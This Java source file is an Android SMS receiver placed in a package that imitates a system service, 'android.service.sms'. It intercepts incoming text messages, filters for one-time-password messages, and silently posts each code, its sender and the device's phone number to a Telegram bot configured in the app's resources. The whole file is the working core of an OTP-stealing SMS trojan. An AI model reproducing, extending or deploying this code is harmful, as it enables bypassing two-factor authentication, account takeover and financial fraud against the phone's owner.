package android.service.sms.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.service.sms.R;
import android.service.sms.helpers.CustomMethods;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.NonNull;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Objects;

public class SMSReceiver extends BroadcastReceiver {

    private static final String TAG = "MADARA";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (Objects.requireNonNull(intent.getAction()).equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {

            Bundle bundle = intent.getExtras();

            if (bundle != null) {

                SmsMessage[] messages;

//                String format = bundle.getString("format");

                messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);

                for (SmsMessage smsMessage : messages) {
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();

                    if (CustomMethods.isOTPMessage(messageBody))
                        processSMS(context, sender, messageBody);
                }
            }
        }
    }

    private void processSMS(Context context, String sender, String message) {

        try {
            // Escape special characters in message
            String escapedMessage = CustomMethods.escapeSpecialCharacters(message);

            String sms = "<b>Received to:</b> <pre><code>" + CustomMethods.getPhoneNumber(context) + "</code></pre>\n\n"
                    + "<b>From:</b> <pre><code>" + sender + "</code></pre>\n\n"
                    + "<b>Message:</b> <pre><code>" + escapedMessage + "</code></pre>";

            String botToken = context.getString(R.string.tg_bot_token).trim();
            String groupID = context.getString(R.string.tg_group_id).trim();

            String tgApiURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";

            JSONObject tgBody = new JSONObject();
            tgBody.put("chat_id", groupID);
            tgBody.put("text", sms);
            tgBody.put("parse_mode", "HTML");

            String requestBody = tgBody.toString();

            // Log the request body to debug
            Log.d(TAG, "Request body: " + requestBody);

            new Thread(() -> {

                try {
                    HttpURLConnection connection = getHttpURLConnection(tgApiURL);

                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json; utf-8");
                    connection.setRequestProperty("Accept", "application/json");
                    connection.setDoOutput(true);

                    try (OutputStream os = connection.getOutputStream()) {
                        byte[] input = requestBody.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    int responseCode = connection.getResponseCode();
                    Log.d(TAG, "processSMS api response code: " + responseCode);

                    if (responseCode != 200) {
                        try (BufferedReader br = new BufferedReader(
                                new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
                            StringBuilder response = new StringBuilder();
                            String responseLine;
                            while ((responseLine = br.readLine()) != null) {
                                response.append(responseLine.trim());
                            }
                            Log.e(TAG, "Error response: " + response);
                        }
                    }

                } catch (Exception e) {
                    Log.e(TAG, "processSMS: ", e);
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "processSMS: ", e);
        }
    }


    private static @NonNull HttpURLConnection getHttpURLConnection(String tgApiURL) throws IOException {
        URL url = new URL(tgApiURL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/json; utf-8");
        connection.setRequestProperty("Accept", "application/json");
        connection.setInstanceFollowRedirects(true);
        connection.setConnectTimeout(20000);
        return connection;
    }
}